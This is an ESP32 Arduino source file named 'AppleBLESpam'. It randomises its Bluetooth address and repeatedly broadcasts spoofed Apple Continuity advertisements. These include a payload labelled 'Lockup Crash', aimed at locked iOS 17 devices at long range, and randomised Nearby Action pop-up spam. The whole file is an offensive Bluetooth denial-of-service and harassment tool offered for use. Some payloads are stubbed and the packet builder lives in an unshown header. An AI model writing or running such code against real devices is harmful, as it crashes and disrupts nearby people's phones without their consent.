#include <Arduino.h>
#include "continuity.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_log.h"
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_gap_ble_api.h"
#include <nvs_flash.h>

static const char *TAG = "AppleBLESpam";

typedef struct {
    const char* title;
    const char* text;
    bool random;
    ContinuityMsg msg;
} Payload;

// Example payloads (simplified for brevity)
static Payload payloads[] = {
    {
        .title = "Lockup Crash",
        .text = "iOS 17, locked, long range",
        .random = false,
        .msg = {
            .type = ContinuityTypeCustomCrash,
            .data = {.custom_crash = {}},
        }
    },
    {
        .title = "Random Action",
        .text = "Spam shuffle Nearby Actions",
        .random = true,
        .msg = {
            .type = ContinuityTypeNearbyAction,
            .data = {.nearby_action = {.flags = 0xC0, .type = 0x00}},
        }
    },
    // Add more payloads as needed
};

#define PAYLOAD_COUNT (sizeof(payloads) / sizeof(payloads[0]))
#define ADV_INTERVAL_MS 100 // Advertisement interval in milliseconds

static uint8_t adv_data[31]; // BLE advertisement data buffer (max 31 bytes)
static uint8_t adv_data_len = 0;

// BLE GAP event handler
static void gap_event_handler(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
    switch (event) {
    case ESP_GAP_BLE_ADV_DATA_SET_COMPLETE_EVT:
        ESP_LOGI(TAG, "Advertisement data set complete");
        esp_ble_gap_start_advertising(NULL);
        break;
    case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
        if (param->adv_start_cmpl.status == ESP_BT_STATUS_SUCCESS) {
            ESP_LOGI(TAG, "Advertising started");
        } else {
            ESP_LOGE(TAG, "Advertising start failed");
        }
        break;
    case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
        if (param->adv_stop_cmpl.status == ESP_BT_STATUS_SUCCESS) {
            ESP_LOGI(TAG, "Advertising stopped");
        } else {
            ESP_LOGE(TAG, "Advertising stop failed");
        }
        break;
    default:
        break;
    }
}

// Initialize Bluetooth
static void init_ble(void) {
    esp_err_t ret;

    // Initialize NVS
    ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    // Initialize Bluetooth controller
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    ret = esp_bt_controller_init(&bt_cfg);
    if (ret) {
        ESP_LOGE(TAG, "Bluetooth controller initialize failed: %s", esp_err_to_name(ret));
        return;
    }

    // Enable Bluetooth controller
    ret = esp_bt_controller_enable(ESP_BT_MODE_BLE);
    if (ret) {
        ESP_LOGE(TAG, "Bluetooth controller enable failed: %s", esp_err_to_name(ret));
        return;
    }

    // Initialize Bluedroid
    ret = esp_bluedroid_init();
    if (ret) {
        ESP_LOGE(TAG, "Bluedroid initialize failed: %s", esp_err_to_name(ret));
        return;
    }

    ret = esp_bluedroid_enable();
    if (ret) {
        ESP_LOGE(TAG, "Bluedroid enable failed: %s", esp_err_to_name(ret));
        return;
    }

    // Register GAP callback
    ret = esp_ble_gap_register_callback(gap_event_handler);
    if (ret) {
        ESP_LOGE(TAG, "GAP register callback failed: %s", esp_err_to_name(ret));
        return;
    }

    // Set random BLE address
    uint8_t mac[6];
    esp_fill_random(mac, sizeof(mac));
    esp_ble_gap_set_rand_addr(mac);
}

// Set advertisement data
static void set_adv_data(Payload *payload) {
    ContinuityMsg *msg = &payload->msg;
    if (payload->random) {
        // Randomize data for random payloads (simplified example)
        msg->data.nearby_action.type = rand() % 0xFF;
    }

    adv_data_len = continuity_get_packet_size(msg->type);
    if (adv_data_len > sizeof(adv_data)) {
        ESP_LOGE(TAG, "Advertisement data too large");
        return;
    }

    continuity_generate_packet(msg, adv_data);
    esp_ble_gap_config_adv_data_raw(adv_data, adv_data_len);
}

// Main task to handle BLE spamming
static void ble_spam_task(void *pvParameters) {
    int payload_index = 0;

    while (1) {
        Payload *payload = &payloads[payload_index];
        ESP_LOGI(TAG, "Sending: %s - %s", payload->title, payload->text);

        set_adv_data(payload);
        vTaskDelay(ADV_INTERVAL_MS / portTICK_PERIOD_MS); // Wait for advertisement to start

        // Stop advertising after a short period, then move to next payload
        esp_ble_gap_stop_advertising();
        vTaskDelay(50 / portTICK_PERIOD_MS); // Small delay before next

        payload_index = (payload_index + 1) % PAYLOAD_COUNT;
    }
}

void setup(void) {
    init_ble();
    xTaskCreate(ble_spam_task, "ble_spam_task", 4096, NULL, 5, NULL);
}

void loop(void){
    delay(1);
}